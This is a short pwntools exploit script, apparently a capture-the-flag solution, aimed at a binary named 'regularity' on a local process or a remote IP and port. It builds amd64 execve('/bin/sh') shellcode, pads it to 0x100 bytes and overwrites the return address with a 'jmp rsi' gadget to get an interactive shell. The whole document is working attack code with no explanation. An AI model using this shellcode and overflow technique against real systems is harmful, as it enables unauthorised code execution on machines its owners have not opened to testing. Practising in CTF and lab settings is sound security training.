#!/usr/bin/python3

from pwn import *
import argparse
from time import *


parser = argparse.ArgumentParser(description='Exploit script')
parser.add_argument('remote', nargs='?', default=None, help='Run the exploit on a remote server')
args = parser.parse_args()

exe = ELF('./regularity', checksec=False)
#libc = ELF('./libc.so.6', checksec=False)
#ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
#libc = exe.libc

context.binary = exe
context.terminal = ['wt.exe','-d', '.', 'wsl.exe', '-d', 'Ubuntu-22.04']

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if args.remote is None:
        gdb.attach(p, gdbscript='''
        b* read+35
        
        c
        ''')
        input()

if args.remote:
    p = remote('83.136.249.46',33766)  
else:
    p = process(exe.path)  

GDB()

jump_rsi = 0x0000000000401041

shell = asm(
    '''
    mov rbx, 29400045130965551
    push rbx

    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
    ''',arch='amd64'
)

pl = flat(
    shell.ljust(0x100,b'a'),
    jump_rsi, 
)
s(pl)





p.interactive()




